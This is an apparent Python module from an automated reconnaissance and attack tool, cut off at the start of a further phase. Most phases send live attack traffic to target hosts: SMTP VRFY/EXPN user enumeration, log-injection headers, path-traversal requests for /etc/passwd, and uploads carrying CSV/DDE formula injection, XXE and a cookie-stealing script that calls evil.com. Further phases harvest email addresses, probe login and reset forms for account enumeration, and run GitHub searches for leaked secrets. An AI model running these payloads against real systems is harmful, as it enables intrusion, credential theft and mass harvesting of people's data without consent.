"""Email security, SMTP, logging, workflow, and miscellaneous phases."""

from reconchain.phases.helpers import *

async def phase_59_EMAIL_SEC(
    domain: str, outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet,
    force: bool = False,
) -> Dict[str, Any]:
    if skip & {"59-EMAIL-SEC"}:
        return {}
    _out = outdir / "email_security.txt"
    if _out.exists() and not force:
        return {"59-EMAIL-SEC": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 59-EMAIL-SEC: email security (SPF/DMARC/DKIM)")
    findings: List[str] = []

    async def _dns_query(record_type: str, name: str) -> List[str]:
        if t.has("dig"):
            try:
                rc, stdout, _ = await _run_cmd_clear_proxy(
                    ["dig", "+short", record_type, name], timeout=10,
                )
                if rc == 0:
                    return [ln.decode().strip() for ln in stdout.splitlines() if ln.strip()]
            except Exception:
                pass
        try:
            rc, stdout, _ = await _run_cmd_clear_proxy(
                ["nslookup", "-type=" + record_type, name], timeout=10,
            )
            if rc >= 0:
                text = stdout.decode(errors="ignore")
                results = []
                for ln in text.splitlines():
                    ln = ln.strip()
                    if "canonical name" in ln.lower() or "name =" in ln.lower():
                        parts = ln.split("=")
                        if len(parts) > 1:
                            results.append(parts[-1].strip().rstrip("."))
                return results
        except Exception:
            pass
        return []

    spf_records = await _dns_query("TXT", domain)
    spf_found = [r for r in spf_records if "v=spf1" in r]
    if spf_found:
        for spf in spf_found:
            if "~all" in spf:
                findings.append(f"[spf-softfail] {domain} — SPF uses ~all (softfail): {spf[:200]}")
            elif "-all" in spf:
                findings.append(f"[spf-hardfail] {domain} — SPF uses -all (hardfail): {spf[:200]}")
            elif "?all" in spf or "+all" in spf:
                findings.append(f"[spf-weak] {domain} — SPF uses ?all/+all (neutral/pass-all): {spf[:200]}")
            else:
                findings.append(f"[spf-present] {domain} — SPF record exists: {spf[:200]}")
    else:
        findings.append(f"[spf-missing] {domain} — no SPF record found (domain is spoofable)")

    dmarc_records = await _dns_query("TXT", f"_dmarc.{domain}")
    dmarc_found = [r for r in dmarc_records if "v=DMARC1" in r]
    if dmarc_found:
        for dmarc in dmarc_found:
            dmarc_lower = dmarc.lower()
            if "p=reject" in dmarc_lower:
                findings.append(f"[dmarc-reject] {domain} — DMARC policy=reject: {dmarc[:200]}")
            elif "p=quarantine" in dmarc_lower:
                findings.append(f"[dmarc-quarantine] {domain} — DMARC policy=quarantine: {dmarc[:200]}")
            elif "p=none" in dmarc_lower:
                findings.append(f"[dmarc-none] {domain} — DMARC policy=none (monitoring only): {dmarc[:200]}")
            else:
                findings.append(f"[dmarc-present] {domain} — DMARC record exists: {dmarc[:200]}")
            if "rua=" not in dmarc_lower and "ruf=" not in dmarc_lower:
                findings.append(f"[dmarc-no-reporting] {domain} — DMARC has no reporting addresses")
    else:
        findings.append(f"[dmarc-missing] {domain} — no DMARC record found (domain is spoofable)")

    for prefix in ["google._domainkey", "selector1._domainkey", "default._domainkey",
                   "dkim._domainkey", "mail._domainkey", "s1._domainkey", "s2._domainkey"]:
        dkim_records = await _dns_query("TXT", f"{prefix}.{domain}")
        if dkim_records:
            findings.append(f"[dkim-present] {domain} — DKIM key found at {prefix}: {dkim_records[0][:100]}")
            break
    else:
        findings.append(f"[dkim-not-found] {domain} — no common DKIM selectors found")

    if not findings:
        findings.append(f"[email-sec] {domain} — email security posture assessed")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"59-EMAIL-SEC: {len(findings)} email security findings → {out}")
    return {"59-EMAIL-SEC": str(out), "count": len(findings)}


# ────────────────── Phase 60-SMTP-ENUM: SMTP Enumeration & Email Bombing ────────
_SMTP_COMMANDS = [
    "VRFY root",
    "VRFY admin",
    "VRFY test",
    "VRFY nobody",
    "EXPN root",
    "EXPN admin",
    "EXPN test",
    "RCPT TO:<root@{domain}>",
    "RCPT TO:<admin@{domain}>",
    "RCPT TO:<test@{domain}>",
]

async def phase_60_SMTP_ENUM(
    domain: str, outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet,
    force: bool = False,
) -> Dict[str, Any]:
    if skip & {"60-SMTP-ENUM"}:
        return {}
    _out = outdir / "smtp_enumeration.txt"
    if _out.exists() and not force:
        return {"60-SMTP-ENUM": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 60-SMTP-ENUM: SMTP enumeration & abuse testing")
    findings: List[str] = []
    hosts_file = outdir / "hosts.txt"
    hosts = read_lines(hosts_file) if hosts_file.exists() else []
    mx_hosts: List[str] = []
    if t.has("dig"):
        try:
            rc, stdout, _ = await _run_cmd_clear_proxy(
                ["dig", "+short", "MX", domain], timeout=10,
            )
            if rc == 0:
                for ln in stdout.decode().splitlines():
                    ln = ln.strip()
                    parts = ln.split()
                    if len(parts) >= 2:
                        mx_hosts.append(parts[-1].rstrip("."))
                    elif ln and not ln.startswith(";"):
                        mx_hosts.append(ln.rstrip("."))
        except Exception:
            pass
    smtp_targets = mx_hosts[:5] if mx_hosts else [h for h in hosts[:3] if ":" not in h]
    for smtp_host in smtp_targets:
        smtp_host_clean = smtp_host.split(":")[0].strip()
        if not smtp_host_clean:
            continue
        for port in (25, 587, 465, 2525):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                result = sock.connect_ex((smtp_host_clean, port))
                if result != 0:
                    sock.close()
                    continue
                sock.settimeout(10)
                banner = sock.recv(1024).decode("utf-8", errors="ignore")
                findings.append(f"[smtp-open] {smtp_host_clean}:{port} — SMTP banner: {banner[:100].strip()}")
                for cmd in _SMTP_COMMANDS:
                    try:
                        cmd_filled = cmd.replace("{domain}", domain)
                        sock.sendall(f"{cmd_filled}\r\n".encode())
                        resp = sock.recv(1024).decode("utf-8", errors="ignore")
                        if any(code in resp for code in ["250", "251", "252"]):
                            findings.append(f"[smtp-enum] {smtp_host_clean}:{port} — {cmd_filled} — {resp[:80].strip()}")
                    except Exception:
                        continue
                sock.close()
            except Exception:
                continue
    if not findings:
        findings.append("[smtp-enum] No open SMTP services detected")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"60-SMTP-ENUM: {len(findings)} SMTP findings → {out}")
    return {"60-SMTP-ENUM": str(out), "count": len(findings)}

_LOG_INJECT_PAYLOADS = [
    "\r\n[INFO] User admin logged in from 127.0.0.1\r\n",
    "\r\n[ERROR] Database connection failed: user=admin password=secret\r\n",
    "\r\n[SECURITY] User authentication bypass successful\r\n",
    "\r\n[INFO] Password reset token: abc123def456\r\n",
    "\r\n[INFO] Credit card: 4111-1111-1111-1111\r\n",
    "\r\n[INFO] Internal IP: 10.0.0.1\r\n",
    "\n[INFO] Injected log entry\n",
    "\r\n[CRITICAL] Stack trace: java.lang.RuntimeException: null\r\n",
]

async def phase_62_LOG_INJECT(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"62-LOG-INJECT"}:
        return {}
    _out = outdir / "log_injection.txt"
    if _out.exists() and not force:
        return {"62-LOG-INJECT": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 62-LOG-INJECT: log injection / log forging detection")
    findings: List[str] = []
    _l_urlopen = _get_urlopener()
    _l_extra_headers = _extra_headers_dict()
    urls = outdir / "urls_all.txt"
    all_urls = read_lines(urls) if urls.exists() else []
    if not all_urls:
        log("warn", "62-LOG-INJECT: no URLs; skipping")
        return {"62-LOG-INJECT": str(_out), "count": 0}
    log_params = {"log", "debug", "trace", "level", "logging", "loglevel", "verbose", "v", "output"}
    log_headers = ["X-Forwarded-For", "X-Real-IP", "X-Forwarded-Host", "Referer", "User-Agent"]
    param_urls = [u for u in all_urls if "=" in u and not _is_static_url(u)][:30]
    for u in param_urls:
        parsed = urllib.parse.urlparse(u)
        qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        if not qs:
            continue
        for param_name in qs:
            if param_name.lower() not in log_params:
                continue
            for payload in _LOG_INJECT_PAYLOADS:
                try:
                    test_qs = qs.copy()
                    test_qs[param_name] = [payload]
                    new_qs = urllib.parse.urlencode(test_qs, doseq=True)
                    test_url = urllib.parse.urlunparse(parsed._replace(query=new_qs))
                    await _throttle_rate()
                    req = urllib.request.Request(test_url, method="GET",
                        headers={"User-Agent": "Mozilla/5.0", **_l_extra_headers})
                    s, _, _ = await _async_urlopen(_l_urlopen, req, timeout=10)
                    if s in (200, 201, 302):
                        findings.append(
                            f"[log-inject-param] {test_url} — param={param_name} — HTTP {s}"
                        )
                        break
                except Exception:
                    continue
    for host in read_lines(outdir / "hosts.txt") if (outdir / "hosts.txt").exists() else []:
        host_clean = host.split(":")[0].strip() if ":" in host else host.strip()
        if not host_clean:
            continue
        for header_name in log_headers:
            for payload in _LOG_INJECT_PAYLOADS[:3]:
                try:
                    req = urllib.request.Request(f"https://{host_clean}/", method="GET",
                        headers={
                            "User-Agent": "Mozilla/5.0",
                            header_name: payload,
                            **_l_extra_headers,
                        })
                    s, _, _ = await _async_urlopen(_l_urlopen, req, timeout=8)
                    if s in (200, 201):
                        findings.append(f"[log-inject-header] https://{host_clean}/ — header={header_name} — HTTP {s}")
                        break
                except Exception:
                    continue
    if not findings:
        findings.append("[log-inject] No log injection vectors detected")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"62-LOG-INJECT: {len(findings)} log injection findings → {out}")
    return {"62-LOG-INJECT": str(out), "count": len(findings)}

_DOC_ATTACK_ENDPOINTS = [
    "/upload", "/api/upload", "/file/upload", "/document/upload",
    "/import", "/api/import", "/csv/import", "/bulk/import",
    "/api/files", "/api/documents",
    "/api/v1/upload", "/api/v2/upload",
]
_DOC_ATTACK_PAYLOADS = [
    ("csv", "=CMD|'/C ping 127.0.0.1'!A0"),
    ("csv", "=HYPERLINK(\"http://evil.com/exfil\",\"Click\")"),
    ("csv", '=DDE("cmd";"/c calc";"AAA")'),
    ("csv", "=WEBSERVICE(\"http://evil.com/\")"),
    ("xlsx", "=EXEC(\"calc\")"),
    ("docx", "${7*7}"),
    ("pdf", "<script>app.alert(1)</script>"),
    ("xml", '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'),
    ("svg", '<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>'),
    ("html", "<html><body><script>fetch('http://evil.com/steal?cookie='+document.cookie)</script></body></html>"),
]

async def phase_63_DOC_ATTACK(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"63-DOC-ATTACK"}:
        return {}
    _out = outdir / "document_attacks.txt"
    if _out.exists() and not force:
        return {"63-DOC-ATTACK": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 63-DOC-ATTACK: document-based attack vector detection")
    findings: List[str] = []
    _d_urlopen = _get_urlopener()
    _d_extra_headers = _extra_headers_dict()
    hosts_file = outdir / "hosts.txt"
    hosts = read_lines(hosts_file) if hosts_file.exists() else []
    if not hosts:
        log("warn", "63-DOC-ATTACK: no hosts; skipping")
        return {"63-DOC-ATTACK": str(_out), "count": 0}
    for host in hosts[:10]:
        host_clean = host.split(":")[0].strip()
        if not host_clean:
            continue
        for scheme in ("https://", "http://"):
            base = f"{scheme}{host_clean}"
            for endpoint in _DOC_ATTACK_ENDPOINTS:
                url = f"{base}{endpoint}"
                try:
                    req = urllib.request.Request(url, method="GET",
                        headers={"User-Agent": "Mozilla/5.0", **_d_extra_headers})
                    s, _, _ = await _async_urlopen(_d_urlopen, req, timeout=8)
                    if s not in (200, 201, 202, 204, 401, 403, 405):
                        continue
                    findings.append(f"[doc-attack-endpoint] {url} — HTTP {s}")
                    for fmt, payload in _DOC_ATTACK_PAYLOADS:
                        try:
                            content_map = {
                                "csv": "text/csv",
                                "xlsx": "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
                                "docx": "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
                                "pdf": "application/pdf",
                                "xml": "application/xml",
                                "svg": "image/svg+xml",
                                "html": "text/html",
                            }
                            ctype = content_map.get(fmt, "application/octet-stream")
                            post_req = urllib.request.Request(url,
                                data=payload.encode("utf-8"),
                                method="POST",
                                headers={
                                    "User-Agent": "Mozilla/5.0",
                                    "Content-Type": ctype,
                                    "Content-Disposition": f'attachment; filename="exploit.{fmt}"',
                                    **_d_extra_headers,
                                })
                            ps, pheaders, pbody = await _async_urlopen(_d_urlopen, post_req, timeout=10)
                            pbody_str = pbody.decode("utf-8", errors="ignore")
                            if ps in (200, 201, 202, 204):
                                findings.append(
                                    f"[doc-attack-upload] {url} — format={fmt} — HTTP {ps} "
                                    f"(document upload accepted)"
                                )
                            if "error" in pbody_str.lower() and any(
                                kw in pbody_str.lower() for kw in ["parse", "invalid", "malformed", "unexpected"]
                            ):
                                findings.append(
                                    f"[doc-attack-parser-error] {url} — format={fmt} — parser error in response"
                                )
                        except urllib.error.HTTPError as e:
                            if e.code in (200, 201, 202, 204):
                                findings.append(
                                    f"[doc-attack-upload] {url} — format={fmt} — HTTP {e.code} "
                                    f"(document upload accepted)"
                                )
                        except Exception:
                            continue
                except Exception:
                    continue
            break
    if not findings:
        findings.append("[doc-attack] No document-based attack vectors detected")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"63-DOC-ATTACK: {len(findings)} document attack findings → {out}")
    return {"63-DOC-ATTACK": str(out), "count": len(findings)}

_IDEMPOTENCY_HEADERS = ["Idempotency-Key", "X-Idempotency-Key", "X-Request-Id", "Idempotency-Key", "X-Idempotency-Request", "Request-Id"]


async def phase_64_IDEMPOTENCY(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"64-IDEMPOTENCY"}:
        return {}
    _out = outdir / "idempotency.txt"
    if _out.exists() and not force:
        return {"64-IDEMPOTENCY": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 64-IDEMPOTENCY: idempotency key replay testing")
    findings: List[str] = []
    _id_urlopen = _get_urlopener()
    _id_extra_headers = _extra_headers_dict()

    # Collect POST endpoints from harvested URLs
    api_endpoints: Set[str] = set()
    urls_file = outdir / "urls_all.txt"
    if urls_file.exists():
        for u in read_lines(urls_file):
            parsed = urllib.parse.urlparse(u)
            base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
            if any(m in base.lower() for m in ("/api/", "/v1/", "/v2/", "/graphql", "/rest/", "/payment", "/transfer", "/order", "/checkout")):
                api_endpoints.add(base)

    if not api_endpoints:
        fuzz_file = outdir / "fuzz.txt"
        if fuzz_file.exists():
            for ln in read_lines(fuzz_file):
                parts = ln.split("\t") if "\t" in ln else ln.split()
                for p in parts:
                    if p.startswith("http") and any(m in p.lower() for m in ("/api/", "/v1/", "/v2/")):
                        api_endpoints.add(p.split("?")[0])

    targets = list(api_endpoints)[:10]
    if not targets:
        findings.append("[idempotency] No API endpoints found for replay testing")
        out = ensure(_out)
        out.write_text("\n".join(findings) + ("\n" if findings else ""))
        log("ok", f"64-IDEMPOTENCY: {len(findings)} findings → {out}")
        return {"64-IDEMPOTENCY": str(out), "count": len(findings)}

    for endpoint in targets:
        for header_name in _IDEMPOTENCY_HEADERS:
            key = f"reconchain-replay-{hashlib.md5(endpoint.encode()).hexdigest()[:8]}"
            test_body = json.dumps({"test": True, "ts": str(datetime.now())}).encode()
            try:
                req1 = urllib.request.Request(endpoint, data=test_body, method="POST",
                    headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0",
                             header_name: key, **_id_extra_headers})
                s1, h1, b1 = await _async_urlopen(_id_urlopen, req1, timeout=10)
                b1_text = b1.decode("utf-8", errors="ignore")
            except urllib.error.HTTPError as e:
                s1, b1_text = e.code, e.read().decode("utf-8", errors="ignore")
            except Exception:
                continue

            modified_body = json.dumps({"test": True, "ts": str(datetime.now()), "modified": True}).encode()
            try:
                req2 = urllib.request.Request(endpoint, data=modified_body, method="POST",
                    headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0",
                             header_name: key, **_id_extra_headers})
                s2, h2, b2 = await _async_urlopen(_id_urlopen, req2, timeout=10)
                b2_text = b2.decode("utf-8", errors="ignore")
            except urllib.error.HTTPError as e:
                s2, b2_text = e.code, e.read().decode("utf-8", errors="ignore")
            except Exception:
                continue

            if s1 in (200, 201, 202) and s2 in (200, 201, 202):
                if b1_text != b2_text or s1 != s2:
                    findings.append(
                        f"[idempotency-violation] {endpoint} — header={header_name} key={key} "
                        f"— replay with different body returned different response "
                        f"(req1: HTTP {s1}, req2: HTTP {s2})"
                    )
                else:
                    findings.append(
                        f"[idempotency-compliant] {endpoint} — header={header_name} — "
                        f"replay returned identical response (HTTP {s1})"
                    )
            elif s1 != s2:
                findings.append(
                    f"[idempotency-different-status] {endpoint} — header={header_name} — "
                    f"first=HTTP {s1}, second=HTTP {s2} (possible non-idempotent)"
                )

    if not findings:
        findings.append("[idempotency] No idempotency-key endpoints detected (expected)")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"64-IDEMPOTENCY: {len(findings)} findings → {out}")
    return {"64-IDEMPOTENCY": str(out), "count": len(findings)}

# ────────────────── Phase 67-PATHNORM: path normalization ──────────────────
_PATH_TRAVERSAL_PAYLOADS = [
    "/..;/", "/../", "/%2e%2e/", "/%2e%2e%2f", "/..%252f", "/..%c0%ae/",
    "/.%00/", "/....//....//", "/..\\", "//", "/%5c..%5c", "/..%5c",
    "/..%252f..%252f", "/%c0%ae%c0%ae/", "/%252e%252e%252f",
]

async def phase_67_PATHNORM(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"67-PATHNORM"}:
        return {}
    _out = outdir / "path_normalization.txt"
    if _out.exists() and not force:
        return {"67-PATHNORM": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 67-PATHNORM: path normalization / traversal")
    findings: List[str] = []
    _pn_urlopen = _get_urlopener()
    _pn_extra = _extra_headers_dict()
    targets = [h for h in (read_lines(outdir / "host_targets.txt") if (outdir / "host_targets.txt").exists() else read_lines(outdir / "hosts.txt") if (outdir / "hosts.txt").exists() else [])][:_PIPELINE_CFG.sample_hosts_ssl]

    if not targets:
        findings.append("[pathnorm] No targets available")
        out = ensure(_out)
        out.write_text("\n".join(findings) + ("\n" if findings else ""))
        return {"67-PATHNORM": str(_out), "count": len(findings)}

    for host in targets:
        base = host.rstrip("/")
        for payload in _PATH_TRAVERSAL_PAYLOADS:
            await _throttle_rate()
            path = payload.lstrip("/")
            test_url = f"{base}/{path}etc/passwd"
            try:
                req = urllib.request.Request(test_url, headers={"User-Agent": "Mozilla/5.0", **_pn_extra})
                status, headers, body = await _async_urlopen(_pn_urlopen, req, timeout=8)
                body_text = body.decode("utf-8", errors="ignore").lower()
                if status == 200 and ("root:" in body_text or "daemon:" in body_text or "bin:" in body_text or "nobody:" in body_text):
                    findings.append(f"[pathnorm-lfi] {test_url} → HTTP 200 (LFI via {payload})")
                elif status == 200 and body_text.strip():
                    findings.append(f"[pathnorm-diff] {test_url} → HTTP 200 ({len(body_text)}b, check manually)")
                elif status not in (404, 400):
                    findings.append(f"[pathnorm-status] {test_url} → HTTP {status}")
            except Exception:
                pass

    if not findings:
        findings.append("[pathnorm] No path normalization issues detected")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"67-PATHNORM: {len(findings)} findings → {out}")
    return {"67-PATHNORM": str(_out), "count": len(findings)}

_EMAIL_RE = re.compile(r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}")

async def phase_71_EMHARVEST(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"71-EMHARVEST"}:
        return {}
    _out = outdir / "emails_harvested.txt"
    if _out.exists() and not force:
        return {"71-EMHARVEST": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 71-EMHARVEST: email harvesting from URLs content")
    findings: List[str] = []
    _eh_urlopen = _get_urlopener()
    _eh_extra = _extra_headers_dict()
    seen_emails: Set[str] = set()

    urls_file = outdir / "urls_all.txt"
    if not urls_file.exists():
        findings.append("[emails] No URLs to scan")
        out = ensure(_out)
        out.write_text("\n".join(findings) + ("\n" if findings else ""))
        return {"71-EMHARVEST": str(_out), "count": len(findings)}

    urls = read_lines(urls_file)[:100]
    for url in urls:
        await _throttle_rate()
        try:
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0", **_eh_extra})
            _, _, body_bytes = await _async_urlopen(_eh_urlopen, req, timeout=10)
            body = body_bytes.decode("utf-8", errors="ignore")
        except Exception:
            continue
        for m in _EMAIL_RE.finditer(body):
            email = m.group().lower()
            if email not in seen_emails:
                seen_emails.add(email)
                findings.append(f"[email] {email} ({url})")

    if not findings:
        findings.append("[emails] No email addresses found in scanned content")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"71-EMHARVEST: {len(findings)} findings → {out}")
    return {"71-EMHARVEST": str(_out), "count": len(findings)}


# ───────────────────── Phase 72-ACCOUNTENUM: account enumeration ─────────────────────
async def phase_72_ACCOUNTENUM(
    domain: str, outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"72-ACCOUNTENUM"}:
        return {}
    _out = outdir / "account_enum.txt"
    if _out.exists() and not force:
        return {"72-ACCOUNTENUM": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 72-ACCOUNTENUM: account enumeration detection")
    findings: List[str] = []
    _ae_urlopen = _get_urlopener()
    _ae_headers = _extra_headers_dict()
    targets_file = outdir / "host_targets.txt"
    if not targets_file.exists() or not read_lines(targets_file):
        log("warn", "72-ACCOUNTENUM: no host targets; skipping")
        return {"72-ACCOUNTENUM": str(_out), "count": 0}
    enum_paths = [
        ("/login", "POST", {"username": "nonexistent_user_12345", "password": "wrongpass"}),
        ("/login", "POST", {"email": "nonexistent_user_12345@test.com", "password": "wrongpass"}),
        ("/api/login", "POST", {"username": "nonexistent_user_12345", "password": "wrongpass"}),
        ("/signup", "POST", {"email": "existing_test@example.com"}),
        ("/register", "POST", {"email": "existing_test@example.com"}),
        ("/forgot-password", "POST", {"email": "nonexistent_user_12345@test.com"}),
        ("/forgot-password", "POST", {"username": "nonexistent_user_12345"}),
        ("/api/forgot-password", "POST", {"email": "nonexistent_user_12345@test.com"}),
        ("/reset-password", "POST", {"token": "invalid_token_12345"}),
        ("/api/reset-password", "POST", {"token": "invalid_token_12345"}),
    ]
    _ae_sem = asyncio.Semaphore(10)
    for host in read_lines(targets_file)[:10]:
        base = host if host.startswith("http") else f"https://{host}"
        for path, method, body in enum_paths:
            async with _ae_sem:
                await _throttle_rate()
                try:
                    url = f"{base.rstrip('/')}{path}"
                    data = urllib.parse.urlencode(body).encode() if body else b""
                    req = urllib.request.Request(url, data=data or None, method=method,
                        headers={"User-Agent": "Mozilla/5.0", "Content-Type": "application/x-www-form-urlencoded", **_ae_headers})
                    status, headers, body_bytes = await _async_urlopen(_ae_urlopen, req, timeout=10)
                    resp_body = body_bytes.decode("utf-8", errors="ignore").lower()
                    resp_len = len(resp_body)
                    resp_time = headers.get("X-Response-Time", "")
                    findings.append(f"[probed] {method} {url} → HTTP {status} len={resp_len} time={resp_time}")
                except urllib.error.HTTPError as e:
                    findings.append(f"[probed] {method} {url} → HTTP {e.code} (expected)")
                except Exception as e:
                    findings.append(f"[error] {method} {url} → {e}")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"72-ACCOUNTENUM: {len(findings)} probes → {out}")
    return {"72-ACCOUNTENUM": str(_out), "count": len(findings)}

async def phase_74_GHTOOLS(
    domain: str, outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, force: bool = False,
) -> Dict[str, Any]:
    if skip & {"74-GHTOOLS"}:
        return {}
    _out = outdir / "github_dorking.txt"
    if _out.exists() and not force:
        return {"74-GHTOOLS": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 74-GHTOOLS: GitHub dorking + supply chain scanning")
    findings: List[str] = []
    org = domain.split(".")[0] if "." in domain else domain
    gh_dorks = [
        f"org:{org} password",
        f"org:{org} secret",
        f"org:{org} api_key",
        f"org:{org} token",
        f"org:{org} aws_key",
        f"org:{org} .env",
        f"org:{org}-----BEGIN",
        f"\"{domain}\" password",
        f"\"{domain}\" secret",
        f"\"{domain}\" NPM_TOKEN",
        f"\"{domain}\" AWS_ACCESS_KEY",
        f"\"{domain}\" slack_token",
        f"{domain} filename:.env",
        f"{domain} filename:.npmrc",
        f"{domain} filename:.dockercfg",
    ]
    _gh_urlopen = _get_urlopener()
    _gh_token = os.environ.get("GITHUB_TOKEN", "")
    _gh_headers = {"User-Agent": "Mozilla/5.0", **_extra_headers_dict()}
    if _gh_token:
        _gh_headers["Authorization"] = f"Bearer {_gh_token}"
    for dork in gh_dorks[:10]:
        await _throttle_rate()
        try:
            query = urllib.parse.quote(dork)
            url = f"https://api.github.com/search/code?q={query}&per_page=5"
            req = urllib.request.Request(url, headers=_gh_headers)
            _, _, body_bytes = await _async_urlopen(_gh_urlopen, req, timeout=15)
            data = json.loads(body_bytes.decode("utf-8", errors="ignore"))
            total = data.get("total_count", 0)
            findings.append(f"[dork] {dork} → {total} results")
            for item in data.get("items", [])[:3]:
                repo = item.get("repository", {}).get("full_name", "?")
                path = item.get("path", "?")
                html_url = item.get("html_url", "")
                findings.append(f"  {repo}/{path} {html_url}")
        except urllib.error.HTTPError as e:
            if e.code == 403:
                findings.append(f"[dork] {dork} → rate limited (403)")
                if not _gh_token:
                    findings.append("  set GITHUB_TOKEN env var for higher rate limits")
                break
            elif e.code == 422:
                findings.append(f"[dork] {dork} → invalid query")
            else:
                findings.append(f"[dork] {dork} → HTTP {e.code}")
        except Exception as e:
            findings.append(f"[dork] {dork} → {e}")
    findings.append("")
    findings.append("--- Dependency Checks ---")
    tech_file = outdir / "tech.txt"
    if tech_file.exists():
        for ln in read_lines(tech_file):
            if "/" in ln:
                pkg = ln.split()[-1] if ln.split() else ""
                findings.append(f"[tech] {pkg}")
    findings.append("[note] Run 'npm audit' on any found package.json or yarn.lock")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"74-GHTOOLS: {len(findings)} dorking findings → {out}")
    return {"74-GHTOOLS": str(_out), "count": len(findings)}


# ───────────────────── Phase 75-MOBILEAPI: Firebase/mobile API scanning ─────────────────────
async def phase_75_MOBILEAPI(
    domain: str, outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, force: bool = False,
) -> Dict[str, Any]:
    if skip & {"75-MOBILEAPI"}:
        return {}
    _out = outdir / "mobile_api.txt"
    if _out.exists() and not force:
        return {"75-MOBILEAPI": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 75-MOBILEAPI: Firebase/mobile API surface scanning")
    findings: List[str] = []
    _mb_urlopen = _get_urlopener()
    _mb_headers = _extra_headers_dict()
    base_domain = domain.split(":")[0].lower().strip()
    org_part = base_domain.split(".")[0] if "." in base_domain else base_domain
    # Firebase DB scanning
    firebase_tests = [
        f"https://{org_part}.firebaseio.com/.json",
        f"https://{base_domain.replace('.', '-')}.firebaseio.com/.json",
        f"https://{org_part}.firebaseio.com/.settings/rules.json",
        f"https://{base_domain}.firebaseio.com/.json",
    ]
    for fb_url in firebase_tests:
        await _throttle_rate()
        try:
            req = urllib.request.Request(fb_url, method="GET",
                headers={"User-Agent": "Mozilla/5.0", **_mb_headers})
            _, _, body_bytes = await _async_urlopen(_mb_urlopen, req, timeout=10)
            body = body_bytes.decode("utf-8", errors="ignore")
            if body.strip() and body.strip() not in ("null", "{}", "[]"):
                findings.append(f"[firebase-open] {fb_url} → data accessible!")
                findings.append(f"  data_preview={body[:200]}")
            else:
                findings.append(f"[firebase-noop] {fb_url} → not open (no data)")
        except urllib.error.HTTPError as e:
            if e.code == 401:
                findings.append(f"[firebase-secured] {fb_url} → HTTP 401 (auth required)")
            else:
                findings.append(f"[firebase-checked] {fb_url} → HTTP {e.code}")
        except Exception as e:
            findings.append(f"[firebase-error] {fb_url} → {e}")
    # Firebase API key scanning in URLs
    urls_file = outdir / "urls_all.txt"
    if urls_file.exists():
        for ln in read_lines(urls_file):
            if "firebaseio.com" in ln or "firebase" in ln.lower():
                findings.append(f"[firebase-ref] {ln}")
            for pat in ("AIza", "key=", "apiKey=", "authDomain="):
                if pat in ln and "firebase" in ln.lower():
                    findings.append(f"[firebase-key] {ln[:150]}")
    # Check for common mobile API patterns in harvested URLs
    mobile_patterns = ["/api/v", "/mobile/", "/app/", "/android/", "/ios/",
                       ".plist", ".apk", ".ipa", ".mobileconfig"]
    _skip_domains = ("jimcdn.com", "jimdo.com", "cdn.", "assets.", "static.", "img.", "images.")
    if urls_file and read_lines(urls_file):
        for url in read_lines(urls_file):
            url_lower = url.lower()
            if any(sd in url_lower for sd in _skip_domains):
                continue
            for pat in mobile_patterns:
                if pat in url_lower:
                    findings.append(f"[mobile-endpoint] {url}")
                    break
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"75-MOBILEAPI: {len(findings)} mobile findings → {out}")
    return {"75-MOBILEAPI": str(_out), "count": len(findings)}

async def phase_76_WORKFLOW(
